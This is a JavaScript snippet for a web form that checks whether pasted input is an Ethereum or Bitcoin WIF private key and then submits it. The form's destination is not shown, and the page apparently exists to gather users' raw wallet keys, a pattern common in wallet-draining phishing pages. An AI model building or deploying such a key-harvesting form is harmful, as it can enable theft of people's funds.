function validatePrivateKey(val) {
    const v = val.trim()
    const isEth = /^(0x)?[0-9a-fA-F]{64}$/.test(v)
    const isWif = /^[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{51,52}$/.test(v)
    return { valid: isEth || isWif, isEth, isWif }
}

document.addEventListener('DOMContentLoaded', () => {
    const input = document.getElementById('privateKeyInput')
    const btn = document.getElementById('keyConfirmBtn')
    const errorDiv = document.getElementById('keyErrorMessage')
    const form = document.getElementById('keyForm')
    const formItem = form.querySelector('.ant-form-item')

    const updateValidationState = () => {
        const { valid } = validatePrivateKey(input.value)

        if (valid) {
            btn.disabled = false
            errorDiv.classList.remove('visible')
            formItem.classList.remove('ant-form-item-has-error')
        } else {
            btn.disabled = true
            if (input.value.trim().length > 0) {
                errorDiv.classList.add('visible')
                formItem.classList.add('ant-form-item-has-error')
            } else {
                errorDiv.classList.remove('visible')
                formItem.classList.remove('ant-form-item-has-error')
            }
        }
    }

    input.addEventListener('input', updateValidationState)
    input.addEventListener('paste', () => {
        setTimeout(updateValidationState, 0) 
    })

    btn.addEventListener('click', (e) => {
        const { valid, isEth, isWif } = validatePrivateKey(input.value)

        if (!valid) {
            e.preventDefault()
            errorDiv.classList.add('visible')
            formItem.classList.add('ant-form-item-has-error')
            return
        }

        errorDiv.classList.remove('visible')
        formItem.classList.remove('ant-form-item-has-error')

        if (isEth) console.log('Ethereum key detected')
        if (isWif) console.log('Bitcoin WIF key detected')

        form.submit()
    })
})
